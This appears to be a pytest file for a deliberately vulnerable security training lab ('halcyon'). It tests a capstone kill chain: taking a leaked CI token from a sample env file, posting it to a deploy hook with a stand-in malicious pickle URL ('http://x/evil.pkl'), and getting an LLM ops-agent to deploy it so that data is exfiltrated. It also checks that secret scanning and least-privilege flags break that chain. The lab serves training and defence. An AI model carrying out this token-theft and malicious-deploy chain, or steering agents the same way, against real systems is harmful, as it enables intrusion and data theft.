from fastapi.testclient import TestClient

from halcyon import crm_fixtures, kb_fixtures
from halcyon.bank import Bank
from halcyon.chain_state import ChainProvider
from halcyon.config import load_settings
from halcyon.kb import InMemoryKB
from halcyon.llm import FinalAnswer, StubLLM, StubToolLLM, ToolCall
from halcyon.mcp_host import in_memory_host
from halcyon.mcp_vault import SERVER_CORE, SERVER_CRM, TokenVault
from halcyon.store import InMemoryStore
from halcyon.web import create_app


def make_chain_client(env, ops_script):
    import itertools
    store = InMemoryStore()
    settings = load_settings(env)
    kb = InMemoryKB()
    kb.seed(kb_fixtures.SEED)
    bank = Bank()
    vault = TokenVault({SERVER_CORE: "c", SERVER_CRM: "d"})
    c = itertools.count(1)
    chain_for = ChainProvider(gen=lambda: f"tok-{next(c)}")
    tool_llm_factory = lambda p, m, k: StubToolLLM(list(ops_script))  # noqa: E731
    mcp_host_factory = lambda sid, s: in_memory_host(  # noqa: E731
        bank, vault, crm_fixtures.SEED, store, s, sid)
    app = create_app(
        store, settings, lambda p, m, k: StubLLM(""),
        lambda sid: kb, lambda sid: bank, tool_llm_factory, mcp_host_factory,
        chain_for=chain_for,
    )
    return TestClient(app), store, chain_for


def _drive_full_chain(client, chain_for, session="p1"):
    tok = chain_for(session).ci_token
    # S1: read the leak blob (records secret_leak_discovered iff the token survives
    # scrubbing -- under SEC_SECRET_SCANNING it won't, and that's the point of
    # test_secret_scanning_breaks_s1, so this call is not asserted on here; the
    # final /validate/chain check is what proves whether S1 actually fired).
    client.get("/source/blob", params={"session": session, "path": ".env.sample"})
    # S2: use the leaked token at the misconfigured deploy hook
    client.post("/internal/deploy", json={
        "session_id": session, "ci_token": tok, "artifact_url": "http://x/evil.pkl"})
    # S3-S5: drive the ops-agent, which deploys -> worker loads -> exfil -> callback
    client.post("/api/ops-agent", json={"session_id": session, "message": "run the runbook"})


def test_full_chain_vulnerable_core_pass():
    client, store, chain_for = make_chain_client(
        {"HALCYON_MODE": "vulnerable"},
        [ToolCall("deploy", {"artifact_url": "http://x/evil.pkl"}), FinalAnswer("done")])
    # S1 has to actually deliver the token to the participant, not just record
    # the audit event -- core=="pass" alone would not catch an endpoint that
    # fired SECRET_LEAK_DISCOVERED but returned {"content": ""}. The token in
    # the body is what a participant copies into /internal/deploy.
    tok = chain_for("p1").ci_token
    blob = client.get("/source/blob", params={"session": "p1", "path": ".env.sample"}).json()
    assert tok in blob["content"]
    _drive_full_chain(client, chain_for)
    assert client.get("/validate/chain", params={"session": "p1"}).json()["core"] == "pass"


def test_secret_scanning_breaks_s1():
    client, store, chain_for = make_chain_client(
        {"HALCYON_MODE": "vulnerable", "SEC_SECRET_SCANNING": "1"},
        [ToolCall("deploy", {"artifact_url": "http://x/evil.pkl"}), FinalAnswer("done")])
    tok = chain_for("p1").ci_token
    blob = client.get("/source/blob", params={"session": "p1", "path": ".env.sample"}).json()
    assert tok not in blob["content"]                       # scrubbed
    _drive_full_chain(client, chain_for)                    # rest can't complete
    assert client.get("/validate/chain", params={"session": "p1"}).json()["core"] == "fail"


def test_ci_least_priv_breaks_s2():
    client, store, chain_for = make_chain_client(
        {"HALCYON_MODE": "vulnerable", "SEC_CI_LEAST_PRIV": "1"},
        [ToolCall("deploy", {"artifact_url": "http://x/evil.pkl"}), FinalAnswer("done")])
    _drive_full_chain(client, chain_for)
    assert client.get("/validate/chain", params={"session": "p1"}).json()["core"] == "fail"


def test_reset_chain_clears_pass_and_rotates_secret():
    client, store, chain_for = make_chain_client(
        {"HALCYON_MODE": "vulnerable"},
        [ToolCall("deploy", {"artifact_url": "http://x/evil.pkl"}), FinalAnswer("done")])
    old = chain_for("p1").vault_master
    _drive_full_chain(client, chain_for)
    assert client.get("/validate/chain", params={"session": "p1"}).json()["core"] == "pass"
    client.post("/reset/chain", json={"session_id": "p1"})
    assert client.get("/validate/chain", params={"session": "p1"}).json()["core"] == "fail"
    assert chain_for("p1").vault_master != old


def test_chat_page_has_capstone_panel():
    client, _, _ = make_chain_client({"HALCYON_MODE": "vulnerable"}, [])
    text = client.get("/chat", params={"session": "p1"}).text
    assert 'data-tab="CHAIN"' in text and 'data-layer="CHAIN"' in text
    for el in ('id="src-tree"', 'id="src-view"', 'id="deploy-token"', 'id="deploy-url"',
               'id="deploy-btn"', 'id="ops-run"', 'id="chain-stages"',
               'id="chain-validate"', 'id="chain-reset"'):
        assert el in text, f"missing capstone element {el}"


def test_capstone_learn_panel_renders():
    client, _, _ = make_chain_client({"HALCYON_MODE": "vulnerable"}, [])
    text = client.get("/chat", params={"session": "p1"}).text
    assert "Kill Chain" in text
    assert "SEC_CI_LEAST_PRIV" in text  # the guard snippet's title names the flag (source uses lowercase)


def test_capstone_stage_tracker_keys_match_validator_order():
    # Highest-consequence untested drift: if an event_type string in
    # validators.chain.ORDER is ever renamed without updating the template's
    # CHAIN_STAGE_LABELS keys, the tracker would silently show all five stages
    # unmet forever -- a false fail live in front of participants, with every
    # other test still green. Pin the correspondence here.
    from halcyon.validators.chain import ORDER

    client, _, _ = make_chain_client({"HALCYON_MODE": "vulnerable"}, [])
    text = client.get("/chat", params={"session": "p1"}).text
    for event_type in ORDER:
        assert event_type in text, f"stage key {event_type!r} missing from capstone tracker"


def test_capstone_source_browser_renders_commit_log_and_does_not_spoil_it():
    # S1's actual discovery mechanism is the commit log (source_browser.py's
    # docstring: "the commit log tells a 'committed a token, reverted it'
    # story that lures the participant into git history"). The tree alone
    # ("click the four files") isn't the intended puzzle; the panel prose
    # must not spoil the inference the fixture was built to teach either.
    client, _, _ = make_chain_client({"HALCYON_MODE": "vulnerable"}, [])
    text = client.get("/chat", params={"session": "p1"}).text
    assert "data.log" in text                    # the commit log is actually rendered
    assert "committed-then-reverted" not in text  # prose no longer spoils the inference


def test_main_app_wires_chain_endpoints():
    # main.py must construct create_app with a ChainProvider so /source/tree exists.
    # We read the source file directly instead of importing to avoid database connection
    # requirements that occur at halcyon.main module load time.
    from pathlib import Path

    main_src = Path(__file__).parent.parent / "halcyon" / "main.py"
    src = main_src.read_text()
    assert "ChainProvider" in src
    assert "chain_for" in src
